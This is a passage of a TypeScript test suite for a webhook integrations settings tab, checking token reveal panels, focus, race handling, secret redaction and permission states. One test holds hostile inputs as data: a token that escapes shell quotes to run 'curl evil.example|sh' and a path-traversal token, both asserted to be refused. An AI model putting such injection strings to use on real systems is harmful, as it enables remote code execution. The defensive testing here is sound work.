    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).disabled).toBe(true);
  });
});

describe('IntegrationsTab — a bad last-use date', () => {
  it('an unparsable lastUsedAt renders the row (as never used) instead of throwing the tab down', async () => {
    list = [hook('wh-1', { lastUsedAt: 'garbage' }), hook('wh-2', { lastUsedAt: new Date(Date.now() - 2 * 3_600_000).toISOString() })];
    await render();
    expect(q('[data-testid="integrations-tab"]')).not.toBeNull();
    expect(inRow('wh-1', 'webhook-last-used')!.textContent).toBe('webhooks.neverUsed');
    // a good date on the next row is still phrased
    expect(inRow('wh-2', 'webhook-last-used')!.textContent).toBe('webhooks.lastUsed{"when":"2 hours ago"}');
  });
});

describe('IntegrationsTab — the copy-once panel closes only on purpose', () => {
  const created = { data: { success: true, data: { ...hook('wh-new', { name: 'Nightly' }), token: 'tok-1' } } };
  async function openReveal() {
    mockPost.mockResolvedValue(created);
    await click(q('[data-testid="webhook-new"]'));
    await type(q('#webhook-name') as HTMLInputElement, 'Nightly');
    await click(q('[data-testid="webhook-create-submit"]'));
    expect(q('[data-testid="webhook-reveal"]')).not.toBeNull();
  }

  it('opens with focus on "Copy URL", not on the X: a reflex Enter copies instead of discarding the token', async () => {
    await render();
    await openReveal();
    expect(document.activeElement).toBe(q('[data-testid="webhook-reveal-url-copy"]'));
    expect(document.activeElement!.getAttribute('aria-label')).toBe('webhooks.reveal.copyUrl');
  });

  it('after a rotation too (the old URL is already dead)', async () => {
    mockPost.mockResolvedValue({ data: { success: true, data: { ...hook('wh-1'), token: 'tok-rotated' } } });
    await render();
    await click(inRow('wh-1', 'webhook-rotate'));
    await click(q('[data-testid="webhook-rotate-dialog-confirm"]'));
    expect(q('[data-testid="webhook-reveal"]')).not.toBeNull();
    expect(document.activeElement).toBe(q('[data-testid="webhook-reveal-url-copy"]'));
  });

  it('Escape leaves it mounted; its X closes it', async () => {
    await render();
    await openReveal();
    await key('Escape');
    expect(q('[data-testid="webhook-reveal"]')).not.toBeNull();
    expect(q('[data-testid="webhook-reveal-url"]')!.textContent).toBe('http://api.test/api/v1/webhooks/wh-new/tok-1');
    await click(q('[data-testid="webhook-reveal"] button[aria-label="common.close"]'));
    expect(q('[data-testid="webhook-reveal"]')).toBeNull();
  });

  it('Escape leaves it mounted; Done closes it', async () => {
    await render();
    await openReveal();
    await key('Escape');
    expect(q('[data-testid="webhook-reveal"]')).not.toBeNull();
    await click(q('[data-testid="webhook-reveal-done"]'));
    expect(q('[data-testid="webhook-reveal"]')).toBeNull();
  });

  it("a mousedown on its backdrop leaves it mounted (while a confirm's backdrop does close the confirm)", async () => {
    await render();
    // control: the same event on a confirm's backdrop closes it
    await click(inRow('wh-1', 'webhook-delete'));
    const confirmBackdrop = q('[data-testid="webhook-delete-dialog"]')!.parentElement!;
    await act(async () => { confirmBackdrop.dispatchEvent(new MouseEvent('mousedown', { bubbles: true })); });
    expect(q('[data-testid="webhook-delete-dialog"]')).toBeNull();

    await openReveal();
    const backdrop = q('[data-testid="webhook-reveal"]')!.parentElement!;
    await act(async () => { backdrop.dispatchEvent(new MouseEvent('mousedown', { bubbles: true })); });
    expect(q('[data-testid="webhook-reveal"]')).not.toBeNull();
  });

  it('Escape while the create request is in flight keeps the create dialog open', async () => {
    let answer!: (v: unknown) => void;
    mockPost.mockImplementation(() => new Promise((r) => { answer = r; }));
    await render();
    await click(q('[data-testid="webhook-new"]'));
    await type(q('#webhook-name') as HTMLInputElement, 'Nightly');
    await click(q('[data-testid="webhook-create-submit"]'));
    expect(q('[data-testid="webhook-create-submit"]')!.textContent).toBe('webhooks.create.creating');
    await key('Escape');
    expect(q('[data-testid="webhook-create-dialog"]')).not.toBeNull();
    await act(async () => { answer(created); });
    await flush();
    expect(q('[data-testid="webhook-reveal-url"]')!.textContent).toBe('http://api.test/api/v1/webhooks/wh-new/tok-1');
  });

  it('a refetch answering the flag-off 403 keeps the open panel (same node) alongside the OFF state', async () => {
    await render();
    await openReveal();
    const panel = q('[data-testid="webhook-reveal"]');
    listAnswer = () => Promise.reject(axiosError(403, 'Webhooks are currently disabled'));
    await act(async () => { reconnect.callbacks[0](); });
    await flush();
    expect(q('[data-testid="integrations-off"]')).not.toBeNull();
    expect(q('[data-testid="webhook-reveal"]')).toBe(panel);
    expect(q('[data-testid="webhook-reveal-url"]')!.textContent).toBe('http://api.test/api/v1/webhooks/wh-new/tok-1');
    // and it still closes on purpose, leaving the OFF state
    await click(q('[data-testid="webhook-reveal-done"]'));
    expect(q('[data-testid="webhook-reveal"]')).toBeNull();
    expect(q('[data-testid="integrations-off"]')).not.toBeNull();
  });
});

describe('IntegrationsTab — focus returns to the opener', () => {
  it('Escape on the create dialog puts focus back on "New webhook" (the name field had it while open)', async () => {
    await render();
    const opener = q('[data-testid="webhook-new"]')!;
    opener.focus();
    await click(opener);
    expect(document.activeElement).toBe(q('#webhook-name'));
    await key('Escape');
    expect(q('[data-testid="webhook-create-dialog"]')).toBeNull();
    expect(document.activeElement).toBe(opener);
  });

  it('Cancel does the same', async () => {
    await render();
    const opener = q('[data-testid="webhook-new"]')!;
    opener.focus();
    await click(opener);
    const cancel = [...q('[data-testid="webhook-create-dialog"]')!.querySelectorAll('button')].find((b) => b.textContent === 'common.cancel');
    await click(cancel ?? null);
    expect(q('[data-testid="webhook-create-dialog"]')).toBeNull();
    expect(document.activeElement).toBe(opener);
  });
});

describe('IntegrationsTab — requests in flight on several rows', () => {
  const ok = (data: unknown) => ({ data: { success: true, data } });

  it("two rows busy at once: A finishing does not re-enable B's rotate confirm (no second rotation)", async () => {
    let answerToggle!: (v: unknown) => void;
    let answerRotate!: (v: unknown) => void;
    mockPatch.mockImplementation(() => new Promise((r) => { answerToggle = r; }));
    mockPost.mockImplementation(() => new Promise((r) => { answerRotate = r; }));
    await render();

    await click(inRow('wh-1', 'webhook-toggle'));
    expect((inRow('wh-1', 'webhook-toggle') as HTMLButtonElement).disabled).toBe(true);
    // row B is not blocked by row A's request
    expect((inRow('wh-2', 'webhook-rotate') as HTMLButtonElement).disabled).toBe(false);
    await click(inRow('wh-2', 'webhook-rotate'));
    const confirm = q('[data-testid="webhook-rotate-dialog-confirm"]') as HTMLButtonElement;
    await click(confirm);
    expect(mockPost).toHaveBeenCalledTimes(1);
    expect(confirm.disabled).toBe(true);
    expect(confirm.textContent).toBe('webhooks.rotate.rotating');

    // A's toggle finishes first
    await act(async () => { answerToggle(ok(hook('wh-1', { enabled: false }))); });
    await flush();
    expect((inRow('wh-1', 'webhook-toggle') as HTMLButtonElement).disabled).toBe(false);
    // B is still in flight: its confirm stays disabled, Escape stays refused
    expect(q('[data-testid="webhook-rotate-dialog"]')).not.toBeNull();
    expect(confirm.disabled).toBe(true);
    expect(confirm.textContent).toBe('webhooks.rotate.rotating');
    await click(confirm);
    await key('Escape');
    expect(q('[data-testid="webhook-rotate-dialog"]')).not.toBeNull();
    expect(mockPost).toHaveBeenCalledTimes(1);

    await act(async () => { answerRotate(ok({ ...hook('wh-2'), token: 'tok-b' })); });
    await flush();
    expect(q('[data-testid="webhook-rotate-dialog"]')).toBeNull();
    expect(q('[data-testid="webhook-reveal-url"]')!.textContent).toBe('http://api.test/api/v1/webhooks/wh-2/tok-b');
  });

  it('a stale rotate answer never replaces a newer one on the panel (the older token is already dead)', async () => {
    const answers: Array<(v: unknown) => void> = [];
    mockPost.mockImplementation(() => new Promise((r) => { answers.push(r); }));
    await render();
    await click(inRow('wh-1', 'webhook-rotate'));
    const confirm = q('[data-testid="webhook-rotate-dialog-confirm"]') as HTMLButtonElement;
    // a double click landing before React re-renders the disabled button
    await act(async () => { confirm.click(); confirm.click(); });
    await flush();
    expect(mockPost).toHaveBeenCalledTimes(2);

    // the NEWER rotation answers first...
    await act(async () => { answers[1](ok({ ...hook('wh-1'), token: 'tok-new' })); });
    await flush();
    expect(q('[data-testid="webhook-reveal-url"]')!.textContent).toBe('http://api.test/api/v1/webhooks/wh-1/tok-new');
    // ...then the older one: it is dropped
    await act(async () => { answers[0](ok({ ...hook('wh-1'), token: 'tok-old' })); });
    await flush();
    expect(q('[data-testid="webhook-reveal-url"]')!.textContent).toBe('http://api.test/api/v1/webhooks/wh-1/tok-new');
    expect(document.body.innerHTML).not.toContain('tok-old');
  });

  it('answers in order: the newer one replaces the older on the panel', async () => {
    const answers: Array<(v: unknown) => void> = [];
    mockPost.mockImplementation(() => new Promise((r) => { answers.push(r); }));
    await render();
    await click(inRow('wh-1', 'webhook-rotate'));
    const confirm = q('[data-testid="webhook-rotate-dialog-confirm"]') as HTMLButtonElement;
    await act(async () => { confirm.click(); confirm.click(); });
    await flush();
    expect(mockPost).toHaveBeenCalledTimes(2);
    await act(async () => { answers[0](ok({ ...hook('wh-1'), token: 'tok-old' })); });
    await flush();
    expect(q('[data-testid="webhook-reveal-url"]')!.textContent).toBe('http://api.test/api/v1/webhooks/wh-1/tok-old');
    await act(async () => { answers[1](ok({ ...hook('wh-1'), token: 'tok-new' })); });
    await flush();
    expect(q('[data-testid="webhook-reveal-url"]')!.textContent).toBe('http://api.test/api/v1/webhooks/wh-1/tok-new');
  });
});

describe('IntegrationsTab — a GitHub secret stays on the panel', () => {
  /** What a console or toast call would print: an Error by its message and stack, anything else as text. */
  const printed = (args: unknown[]) => args
    .map((a) => (a instanceof Error ? `${a.message} ${a.stack ?? ''}` : typeof a === 'string' ? a : JSON.stringify(a)))
    .join(' ');

  it('never reaches a toast or the console: a create, copies, a failed copy, a rotation, a refused rotation', async () => {
    const spies = (['log', 'info', 'warn', 'error', 'debug'] as const).map((m) => vi.spyOn(console, m).mockImplementation(() => {}));
    mockPost.mockResolvedValueOnce({ data: { success: true, data: { ...hook('wh-gh', { type: 'github', name: 'Repo' }), token: 'tok-gh', secret: SECRET } } });
    await render();
    await click(q('[data-testid="webhook-new"]'));
    await type(q('#webhook-name') as HTMLInputElement, 'Repo');
    await click(q('[data-testid="webhook-type-github"]'));
    await click(q('[data-testid="webhook-create-submit"]'));
    expect(q('[data-testid="webhook-reveal-secret"]')!.textContent).toBe(SECRET);
    await click(q('[data-testid="webhook-reveal-secret-copy"]'));
    await click(q('[data-testid="webhook-reveal-url-copy"]'));
    (navigator.clipboard.writeText as Mock).mockRejectedValue(new Error('denied'));
    await click(q('[data-testid="webhook-reveal-secret-copy"]'));
    expect(toastError).toHaveBeenCalledWith('webhooks.reveal.copyFailed');
    (navigator.clipboard.writeText as Mock).mockResolvedValue(undefined);
    await click(q('[data-testid="webhook-reveal-done"]'));

    mockPost.mockResolvedValueOnce({ data: { success: true, data: { ...hook('wh-2', { type: 'github' }), token: 'tok-gh2', secret: SECRET_ROTATED } } });
    await click(inRow('wh-2', 'webhook-rotate'));
    await click(q('[data-testid="webhook-rotate-dialog-confirm"]'));
    expect(q('[data-testid="webhook-reveal-secret"]')!.textContent).toBe(SECRET_ROTATED);
    await click(q('[data-testid="webhook-reveal-secret-copy"]'));
    await click(q('[data-testid="webhook-reveal-done"]'));

    mockPost.mockRejectedValueOnce(axiosError(404, 'Webhook not found'));
    await click(inRow('wh-2', 'webhook-rotate'));
    await click(q('[data-testid="webhook-rotate-dialog-confirm"]'));
    expect(toastError).toHaveBeenCalledWith(expect.stringContaining('serverErrors.webhookNotFound'));

    // the failed copy and the refused rotation were logged, so there is output
    // to search: the copy three times (the async API's refusal, then the
    // textarea fallback failing too — jsdom has no execCommand — then the
    // panel's own warning), the rotation once
    expect(spies[2]).toHaveBeenCalledTimes(4);
    const outputs = [
      ...toastSuccess.mock.calls, ...toastError.mock.calls,
      ...(toast.info as unknown as Mock).mock.calls, ...(toast.warning as unknown as Mock).mock.calls,
      ...spies.flatMap((spy) => spy.mock.calls),
    ].map(printed);
    expect(outputs.length).toBeGreaterThan(5);
    for (const out of outputs) {
      expect(out).not.toContain(SECRET);
      expect(out).not.toContain(SECRET_ROTATED);
      expect(out).not.toContain('tok-gh');
    }
    spies.forEach((spy) => spy.mockRestore());
  });
});

describe('IntegrationsTab — refusals are logged', () => {
  it('a failed rotate is logged once (the error message, never the token) and toasted', async () => {
    mockPost.mockRejectedValue(axiosError(404, 'Webhook not found'));
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    await render();
    await click(inRow('wh-1', 'webhook-rotate'));
    await click(q('[data-testid="webhook-rotate-dialog-confirm"]'));
    expect(warn).toHaveBeenCalledTimes(1);
    expect(warn).toHaveBeenCalledWith('[Integrations] Webhook action failed:', 'Request failed');
    expect(toastError).toHaveBeenCalledWith(expect.stringContaining('serverErrors.webhookNotFound'));
    expect(q('[data-testid="webhook-reveal"]')).toBeNull();
    warn.mockRestore();
  });

  it('the flag-off answer is a state, not a failure: nothing is logged', async () => {
    mockPatch.mockRejectedValue(axiosError(403, 'Webhooks are currently disabled'));
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    await render();
    listAnswer = () => Promise.reject(axiosError(403, 'Webhooks are currently disabled'));
    await click(inRow('wh-1', 'webhook-toggle'));
    expect(q('[data-testid="integrations-off"]')).not.toBeNull();
    expect(warn).not.toHaveBeenCalled();
    warn.mockRestore();
  });
});

describe('IntegrationsTab — a create/rotate answer that is not a plain URL segment', () => {
  it.each([
    ['a token with a path in it', { id: 'wh-new', token: 'tok/../../admin' }],
    ['a token that leaves the curl quotes', { id: 'wh-new', token: "tok';curl evil.example|sh;'" }],
    ['an id with a query', { id: 'wh-new?x=1', token: 'tok-1' }],
  ])('%s: no panel, no URL anywhere, a translated toast, logged without the token', async (_label, bad) => {
    mockPost.mockResolvedValue({ data: { success: true, data: { ...hook('wh-new', { name: 'Nightly' }), ...bad } } });
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    await render();
    await click(q('[data-testid="webhook-new"]'));
    await type(q('#webhook-name') as HTMLInputElement, 'Nightly');
    await click(q('[data-testid="webhook-create-submit"]'));

    expect(q('[data-testid="webhook-reveal"]')).toBeNull();
    expect(document.body.innerHTML).not.toContain(bad.token);
    expect(document.body.innerHTML).not.toContain('/webhooks/');
    expect(toastError).toHaveBeenCalledWith('webhooks.reveal.invalidUrl');
    expect(warn).toHaveBeenCalledTimes(1);
    for (const call of warn.mock.calls) expect(call.join(' ')).not.toContain(bad.token);
    // the webhook exists all the same: the list is the server's
    expect(listCalls()).toBe(2);
    warn.mockRestore();
  });

  it('a malformed ROTATE answer: same refusal, and an older valid answer arriving later still never lands', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const answers: Array<(v: unknown) => void> = [];
    mockPost.mockImplementation(() => new Promise((r) => { answers.push(r); }));
    await render();
    await click(inRow('wh-1', 'webhook-rotate'));
    const confirm = q('[data-testid="webhook-rotate-dialog-confirm"]') as HTMLButtonElement;
    // two rotations in flight (a double click landing before the re-render)
    await act(async () => { confirm.click(); confirm.click(); });
    await flush();
    expect(mockPost).toHaveBeenCalledTimes(2);

    // the NEWER one answers first, malformed: refused
    await act(async () => { answers[1]({ data: { success: true, data: { ...hook('wh-1'), token: 'bad token' } } }); });
    await flush();
    expect(toastError).toHaveBeenCalledWith('webhooks.reveal.invalidUrl');
    expect(q('[data-testid="webhook-reveal"]')).toBeNull();

    // the older one's token was killed by the newer rotation: it never shows
    await act(async () => { answers[0]({ data: { success: true, data: { ...hook('wh-1'), token: 'old-tok' } } }); });
    await flush();
    expect(q('[data-testid="webhook-reveal"]')).toBeNull();
    expect(document.body.innerHTML).not.toContain('old-tok');
    warn.mockRestore();
  });
});

describe('IntegrationsTab — the cap follows the server', () => {
  const limitsCalls = () => mockGet.mock.calls.filter(([url]) => url === '/servers/srv-1/limits').length;

  it('a webhook:changed hint reloads the cap with the list: an admin freezing creation (10 → 0) shows', async () => {
    await render();
    expect(limitsCalls()).toBe(1);
    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).disabled).toBe(false);

    maxWebhooks = 0;
    const [handler] = changedHandlers();
    await act(async () => { handler({ serverId: 'srv-1' }); });
    await flush();
    expect(limitsCalls()).toBe(2);
    const button = q('[data-testid="webhook-new"]') as HTMLButtonElement;
    expect(button.disabled).toBe(true);
    expect(button.title).toBe('webhooks.frozen');
  });

  it('a reconnect reloads it too: 0 → 10 re-enables "New webhook"', async () => {
    maxWebhooks = 0;
    await render();
    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).disabled).toBe(true);

    maxWebhooks = 10;
    await act(async () => { reconnect.callbacks[0](); });
    await flush();
    expect(limitsCalls()).toBe(2);
    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).disabled).toBe(false);
    expect(q('[data-testid="integrations-count"]')!.textContent).toContain('webhooks.usage{"used":2,"max":10}');
  });

  it('a failed cap reload is logged and keeps the last known cap', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    maxWebhooks = 2;
    await render();
    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).disabled).toBe(true);
    const base = mockGet.getMockImplementation()!;
    mockGet.mockImplementation((url: string) => (url === '/servers/srv-1/limits' ? Promise.reject(new Error('offline')) : base(url)));
    const [handler] = changedHandlers();
    await act(async () => { handler({ serverId: 'srv-1' }); });
    await flush();
    expect(warn).toHaveBeenCalledWith('[Integrations] Failed to load limits:', 'offline');
    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).title).toBe('webhooks.atCap{"max":2}');
    warn.mockRestore();
  });
});

describe('IntegrationsTab — channel:deleted (a cascade deletes the webhooks, no webhook:changed)', () => {
  const deletedHandlers = () => socket.on.mock.calls
    .filter(([e]) => e === 'channel:deleted')
    .map(([, h]) => h as (d: { channelId: string; serverId: string }) => void);

  it('a channel of this server refetches the list (and the cap); another server\'s does not', async () => {
    await render();
    expect(deletedHandlers()).toHaveLength(1);
    const [handler] = deletedHandlers();

    await act(async () => { handler({ channelId: 'ch-x', serverId: 'srv-2' }); });
    await flush();
    expect(listCalls()).toBe(1);

    list = [hook('wh-2', { type: 'github', enabled: false, channelId: 'ch-gone', createdBy: null })];
    await act(async () => { handler({ channelId: 'ch-1', serverId: 'srv-1' }); });
    await flush();
    expect(listCalls()).toBe(2);
    expect(q('[data-testid="webhook-row-wh-1"]')).toBeNull();
    expect(row('wh-2')).not.toBeNull();
  });

  it('a malformed payload is ignored, never thrown', async () => {
    await render();
    const [handler] = deletedHandlers();
    await act(async () => { handler(undefined as unknown as { channelId: string; serverId: string }); });
    await flush();
    expect(listCalls()).toBe(1);
  });

  it('unsubscribes on unmount, with the same handler', async () => {
    await render();
    const [handler] = deletedHandlers();
    act(() => root.unmount());
    expect(socket.off).toHaveBeenCalledWith('channel:deleted', handler);
    root = createRoot(container);
  });
});

describe('IntegrationsTab — the create picker asks the server (/webhooks/targets)', () => {
  const pickerOptions = () => [...(q('[data-testid="webhook-create-channel"]') as HTMLSelectElement).options].map((o) => [o.value, o.textContent]);
  const deletedHandler = () => socket.on.mock.calls.filter(([e]) => e === 'channel:deleted').map(([, h]) => h as (d: { channelId: string; serverId: string }) => void)[0];

  it('fetches when the dialog opens (not before) and offers exactly the answer, in its order, with no filter of its own', async () => {
    // the store would offer ch-1 and ch-2; the server says this caller can bind
    // ch-2 only, plus a channel the store has not loaded: the answer wins
    targets = [target('ch-2', 'deploys', 0), target('ch-ops', 'ops', 1)];
    await render();
    expect(targetsCalls()).toBe(0);
    await click(q('[data-testid="webhook-new"]'));
    expect(targetsCalls()).toBe(1);
    expect(pickerOptions()).toEqual([['ch-2', '#deploys'], ['ch-ops', '#ops']]);
  });

  it('the POST carries the picked target; the first one by default', async () => {
    targets = [target('ch-2', 'deploys', 0), target('ch-ops', 'ops', 1)];
    mockPost.mockResolvedValue({ data: { success: true, data: { ...hook('wh-new'), token: 'tok-1' } } });
    await render();
    await click(q('[data-testid="webhook-new"]'));
    await type(q('#webhook-name') as HTMLInputElement, 'CI');
    await click(q('[data-testid="webhook-create-submit"]'));
    expect(mockPost).toHaveBeenCalledWith('/servers/srv-1/webhooks', { channelId: 'ch-2', name: 'CI', type: 'generic' });
  });

  it('loading: a status line instead of the select, and nothing to submit until the answer', async () => {
    let answer!: (v: unknown) => void;
    targetsAnswer = () => new Promise((r) => { answer = r; });
    await render();
    await click(q('[data-testid="webhook-new"]'));
    const loading = q('[data-testid="webhook-channels-loading"]')!;
    expect(loading.textContent).toBe('webhooks.create.loadingChannels');
    expect(loading.getAttribute('role')).toBe('status');
    expect(q('[data-testid="webhook-create-channel"]')).toBeNull();
    expect(q('[data-testid="webhook-no-channels"]')).toBeNull();
    expect((q('[data-testid="webhook-create-submit"]') as HTMLButtonElement).disabled).toBe(true);
    // Enter in the name field cannot post either
    await type(q('#webhook-name') as HTMLInputElement, 'CI');
    await act(async () => { (q('[data-testid="webhook-create-dialog"] form') as HTMLFormElement).requestSubmit(); });
    expect(mockPost).not.toHaveBeenCalled();

    await act(async () => { answer({ data: { success: true, data: [target('ch-2', 'deploys')] } }); });
    await flush();
    expect(q('[data-testid="webhook-channels-loading"]')).toBeNull();
    expect(pickerOptions()).toEqual([['ch-2', '#deploys']]);
    expect((q('[data-testid="webhook-create-submit"]') as HTMLButtonElement).disabled).toBe(false);
  });

  it('a failed fetch falls back to the visible plaintext text channels (logged, not toasted); the server\'s refusal stays the authority', async () => {
    targetsAnswer = () => Promise.reject(axiosError(500, 'boom'));
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    await render();
    await click(q('[data-testid="webhook-new"]'));
    expect(pickerOptions()).toEqual([['ch-1', '#general'], ['ch-2', '#deploys']]);
    expect(warn).toHaveBeenCalledWith('[Integrations] Failed to load webhook targets, offering the visible text channels:', 'Request failed');
    expect(toastError).not.toHaveBeenCalled();

    // the fallback cannot know SEND_MESSAGES: the create check answers, translated
    mockPost.mockRejectedValue(axiosError(403, 'You do not have permission to send messages in this channel'));
    await type(q('#webhook-name') as HTMLInputElement, 'CI');
    await click(q('[data-testid="webhook-create-submit"]'));
    expect(toastError).toHaveBeenCalledWith(expect.stringMatching(/^serverErrors\.noPermissionSendMessages\{/));
    expect(q('[data-testid="webhook-create-dialog"]')).not.toBeNull();
    warn.mockRestore();
  });

  it('a malformed answer (not a list) falls back the same way', async () => {
    targetsAnswer = () => Promise.resolve({ data: { success: true, data: { channels: [] } } });
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    await render();
    await click(q('[data-testid="webhook-new"]'));
    expect(pickerOptions()).toEqual([['ch-1', '#general'], ['ch-2', '#deploys']]);
    expect(warn).toHaveBeenCalledTimes(1);
    warn.mockRestore();
  });

  it('the flag-off 403 on the fetch flips the tab off, with no toast and nothing logged', async () => {
    targetsAnswer = () => Promise.reject(axiosError(403, 'Webhooks are currently disabled'));
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    await render();
    await click(q('[data-testid="webhook-new"]'));
    expect(q('[data-testid="integrations-off"]')).not.toBeNull();
    expect(q('[data-testid="webhook-create-dialog"]')).toBeNull();
    expect(toastError).not.toHaveBeenCalled();
    expect(warn).not.toHaveBeenCalled();
    warn.mockRestore();
  });

  it('every opening asks again (a role change in between moves the list)', async () => {
    await render();
    await click(q('[data-testid="webhook-new"]'));
    await key('Escape');
    targets = [target('ch-2', 'deploys')];
    await click(q('[data-testid="webhook-new"]'));
    expect(targetsCalls()).toBe(2);
    expect(pickerOptions()).toEqual([['ch-2', '#deploys']]);
  });

  it('a stale answer (from an earlier opening) never lands on a newer one', async () => {
    const answers: Array<(v: unknown) => void> = [];
    targetsAnswer = () => new Promise((r) => { answers.push(r); });
    await render();
    await click(q('[data-testid="webhook-new"]'));
    await key('Escape');
    await click(q('[data-testid="webhook-new"]'));
    expect(answers).toHaveLength(2);
    await act(async () => { answers[1]({ data: { success: true, data: [target('ch-2', 'deploys')] } }); });
    await flush();
    await act(async () => { answers[0]({ data: { success: true, data: [target('ch-1', 'general')] } }); });
    await flush();
    expect(pickerOptions()).toEqual([['ch-2', '#deploys']]);
  });

  it('channel:deleted for this server while it is open asks again: the deleted channel leaves the picker, the choice falls back', async () => {
    await render();
    await click(q('[data-testid="webhook-new"]'));
    await pick(q('[data-testid="webhook-create-channel"]') as HTMLSelectElement, 'ch-2');
    targets = [target('ch-1', 'general')];
    await act(async () => { deletedHandler()({ channelId: 'ch-2', serverId: 'srv-1' }); });
    await flush();
    expect(targetsCalls()).toBe(2);
    expect(pickerOptions()).toEqual([['ch-1', '#general']]);
    expect((q('[data-testid="webhook-create-channel"]') as HTMLSelectElement).value).toBe('ch-1');
  });

  it('with the dialog closed, channel:deleted and a reconnect refetch the list only', async () => {
    await render();
    await act(async () => { deletedHandler()({ channelId: 'ch-2', serverId: 'srv-1' }); });
    await act(async () => { reconnect.callbacks[0](); });
    await flush();
    expect(listCalls()).toBe(3);
    expect(targetsCalls()).toBe(0);
  });

  it('a reconnect while it is open asks again too', async () => {
    await render();
    await click(q('[data-testid="webhook-new"]'));
    await act(async () => { reconnect.callbacks[0](); });
    await flush();
    expect(targetsCalls()).toBe(2);
  });
});

describe('IntegrationsTab — a webhook an administrator disabled', () => {
  const AT = '2026-10-18T09:00:00.000Z';

  it('a badge says so (with why on hover); the Enable control is shown but disabled, with the reason as its tooltip', async () => {
    list = [hook('wh-1', { enabled: false, adminDisabledAt: AT })];
    await render();
    const chip = inRow('wh-1', 'webhook-admin-disabled')!;
    expect(chip.textContent).toBe('webhooks.adminDisabledChip');
    expect(chip.title).toBe('webhooks.adminDisabledHint');
    // the badge replaces the plain "Disabled" chip
    expect(inRow('wh-1', 'webhook-disabled')).toBeNull();
    const toggle = inRow('wh-1', 'webhook-toggle') as HTMLButtonElement;
    expect(toggle).not.toBeNull();
    expect(toggle.disabled).toBe(true);
    expect(toggle.getAttribute('aria-label')).toBe('webhooks.actions.enable');
    expect(toggle.title).toBe('webhooks.adminDisabledHint');
    // rotate and delete stay the owner's
    expect((inRow('wh-1', 'webhook-rotate') as HTMLButtonElement).disabled).toBe(false);
    expect((inRow('wh-1', 'webhook-delete') as HTMLButtonElement).disabled).toBe(false);
  });

  it('a click on the disabled control sends no PATCH, even dispatched past the disabled attribute', async () => {
    list = [hook('wh-1', { enabled: false, adminDisabledAt: AT })];
    await render();
    const toggle = inRow('wh-1', 'webhook-toggle') as HTMLButtonElement;
    await click(toggle);
    expect(mockPatch).not.toHaveBeenCalled();
    // the handler refuses on its own, should the attribute ever be lost
    toggle.disabled = false;
    await click(toggle);
    expect(mockPatch).not.toHaveBeenCalled();
    expect(listCalls()).toBe(1);
  });

  it('the administrator wins over a removed creator: no rotate-then-enable advice', async () => {
    list = [hook('wh-1', { enabled: false, adminDisabledAt: AT, creatorRemovedAt: AT })];
    await render();
    expect(inRow('wh-1', 'webhook-admin-disabled')).not.toBeNull();
    expect(inRow('wh-1', 'webhook-creator-removed')).toBeNull();
  });

  it("an enable refused because an administrator disabled it meanwhile: translated toast, and the refetch shows the badge", async () => {
    list = [hook('wh-1', { enabled: false })];
    await render();
    mockPatch.mockRejectedValue(axiosError(403, 'This webhook was disabled by an administrator'));
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    list = [hook('wh-1', { enabled: false, adminDisabledAt: AT })];
    await click(inRow('wh-1', 'webhook-toggle'));
    expect(mockPatch).toHaveBeenCalledWith('/servers/srv-1/webhooks/wh-1', { enabled: true });
    expect(toastError).toHaveBeenCalledWith(expect.stringMatching(/^serverErrors\.webhookAdminDisabled\{/));
    expect(inRow('wh-1', 'webhook-admin-disabled')).not.toBeNull();
    expect((inRow('wh-1', 'webhook-toggle') as HTMLButtonElement).disabled).toBe(true);
    warn.mockRestore();
  });

  it('an enable without SEND_MESSAGES on the channel is the server\'s refusal, translated', async () => {
    list = [hook('wh-1', { enabled: false })];
    mockPatch.mockRejectedValue(axiosError(403, 'You do not have permission to send messages in this channel'));
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    await render();
    await click(inRow('wh-1', 'webhook-toggle'));
    expect(toastError).toHaveBeenCalledWith(expect.stringMatching(/^serverErrors\.noPermissionSendMessages\{/));
    warn.mockRestore();
  });
});

describe('IntegrationsTab — a webhook whose creator was removed', () => {
  const AT = '2026-10-18T12:00:00.000Z';
  const onDay = (iso: string) => new Intl.DateTimeFormat('en', { dateStyle: 'medium' }).format(new Date(iso));

  it('a notice with the date says why it is off and to rotate first; the row is plainly disabled, enabling stays allowed', async () => {
    list = [hook('wh-1', { enabled: false, creatorRemovedAt: AT })];
    await render();
    const notice = inRow('wh-1', 'webhook-creator-removed')!;
    expect(notice.getAttribute('role')).toBe('note');
    expect(inRow('wh-1', 'webhook-creator-removed-text')!.textContent).toBe(`webhooks.creatorRemoved${JSON.stringify({ date: onDay(AT) })}`);
    expect(inRow('wh-1', 'webhook-disabled')!.textContent).toBe('webhooks.disabledChip');
    expect(inRow('wh-1', 'webhook-admin-disabled')).toBeNull();

    mockPatch.mockResolvedValue({ data: { success: true, data: hook('wh-1') } });
    const toggle = inRow('wh-1', 'webhook-toggle') as HTMLButtonElement;
    expect(toggle.disabled).toBe(false);
    expect(toggle.title).toBe('webhooks.actions.enable');
    await click(toggle);
    expect(mockPatch).toHaveBeenCalledWith('/servers/srv-1/webhooks/wh-1', { enabled: true });
  });

  it('its Rotate is the usual flow: the confirm, POST /rotate, then the copy-once panel', async () => {
    list = [hook('wh-1', { enabled: false, creatorRemovedAt: AT })];
    mockPost.mockResolvedValue({ data: { success: true, data: { ...hook('wh-1'), token: 'tok-fresh' } } });
    await render();
    const rotate = inRow('wh-1', 'webhook-creator-removed-rotate')!;
    expect(rotate.tagName).toBe('BUTTON');
    expect(rotate.textContent).toBe('webhooks.actions.rotate');
    await click(rotate);
    expect(q('[data-testid="webhook-rotate-dialog"]')!.textContent).toContain('webhooks.rotate.body{"name":"CI"}');
    expect(mockPost).not.toHaveBeenCalled();
